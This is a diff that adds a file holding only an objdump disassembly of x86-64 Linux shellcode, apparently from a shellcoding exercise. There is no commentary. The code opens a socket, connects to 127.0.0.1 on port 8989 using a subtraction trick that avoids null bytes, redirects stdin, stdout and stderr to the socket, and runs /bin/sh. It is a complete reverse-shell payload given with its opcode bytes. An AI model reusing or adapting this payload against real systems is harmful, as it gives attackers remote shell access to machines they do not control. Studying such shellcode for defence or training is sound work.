@@ -1,0 +1,62 @@
+```
+
+0000000000401000 <_start>:
+  401000:       48 31 c0                xor    %rax,%rax
+  401003:       48 31 db                xor    %rbx,%rbx
+  401006:       48 31 d2                xor    %rdx,%rdx
+  401009:       48 31 ff                xor    %rdi,%rdi
+  40100c:       48 31 f6                xor    %rsi,%rsi
+  40100f:       b0 29                   mov    $0x29,%al
+  401011:       40 b7 02                mov    $0x2,%dil
+  401014:       40 b6 01                mov    $0x1,%sil
+  401017:       0f 05                   syscall 
+  401019:       49 89 c7                mov    %rax,%r15
+  40101c:       b0 2a                   mov    $0x2a,%al
+  40101e:       4c 89 ff                mov    %r15,%rdi
+  401021:       48 31 f6                xor    %rsi,%rsi
+  401024:       be 90 11 11 12          mov    $0x12111190,%esi
+  401029:       48 81 ee 11 11 11 11    sub    $0x11111111,%rsi
+  401030:       56                      push   %rsi
+  401031:       66 68 23 1d             pushw  $0x1d23
+  401035:       66 6a 02                pushw  $0x2
+  401038:       48 89 e6                mov    %rsp,%rsi
+  40103b:       b2 18                   mov    $0x18,%dl
+  40103d:       0f 05                   syscall 
+  40103f:       48 31 c0                xor    %rax,%rax
+  401042:       48 31 d2                xor    %rdx,%rdx
+  401045:       b0 21                   mov    $0x21,%al
+  401047:       4c 89 ff                mov    %r15,%rdi
+  40104a:       48 31 f6                xor    %rsi,%rsi
+  40104d:       0f 05                   syscall 
+  40104f:       48 31 c0                xor    %rax,%rax
+  401052:       48 31 d2                xor    %rdx,%rdx
+  401055:       b0 21                   mov    $0x21,%al
+  401057:       4c 89 ff                mov    %r15,%rdi
+  40105a:       48 ff c6                inc    %rsi
+  40105d:       0f 05                   syscall 
+  40105f:       48 31 c0                xor    %rax,%rax
+  401062:       48 31 d2                xor    %rdx,%rdx
+  401065:       b0 21                   mov    $0x21,%al
+  401067:       4c 89 ff                mov    %r15,%rdi
+  40106a:       48 ff c6                inc    %rsi
+  40106d:       0f 05                   syscall 
+  40106f:       4d 31 ff                xor    %r15,%r15
+  401072:       4d 31 f6                xor    %r14,%r14
+  401075:       48 31 ff                xor    %rdi,%rdi
+  401078:       48 31 f6                xor    %rsi,%rsi
+  40107b:       48 31 c0                xor    %rax,%rax
+  40107e:       41 57                   push   %r15
+  401080:       49 bf 2f 2f 62 69 6e    movabs $0x68732f6e69622f2f,%r15
+  401087:       2f 73 68 
+  40108a:       41 57                   push   %r15
+  40108c:       48 89 e7                mov    %rsp,%rdi
+  40108f:       41 56                   push   %r14
+  401091:       57                      push   %rdi
+  401092:       48 89 e6                mov    %rsp,%rsi
+  401095:       b0 3b                   mov    $0x3b,%al
+  401097:       48 31 d2                xor    %rdx,%rdx
+  40109a:       0f 05                   syscall 
+  40109c:       b0 3c                   mov    $0x3c,%al
+  40109e:       48 31 ff                xor    %rdi,%rdi
+  4010a1:       0f 05                   syscall 
+```
